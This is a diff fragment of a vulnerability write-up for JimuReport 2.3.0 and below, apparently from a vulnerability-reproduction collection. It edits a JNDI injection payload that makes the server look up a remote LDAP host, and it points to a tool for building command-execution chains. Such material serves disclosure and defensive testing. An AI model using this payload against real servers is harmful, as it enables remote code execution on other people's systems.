@@ -15,7 +15,7 @@ JimuReport versions 2.3.0 and below do not effectively restrict user input, dire
 ### payload
 
 ```java
-=use javax.naming.*;InitialContext.doLookup("ldap://x.x.x.x:50389/de9412")
+=use javax.naming.*;InitialContext.doLookup("ldap://x.x.x.x:x/exp")
 ```
 Use java-chains to generate DruidJdbcAttack-H2 command execution chains.
 https://github.com/vulhub/java-chains
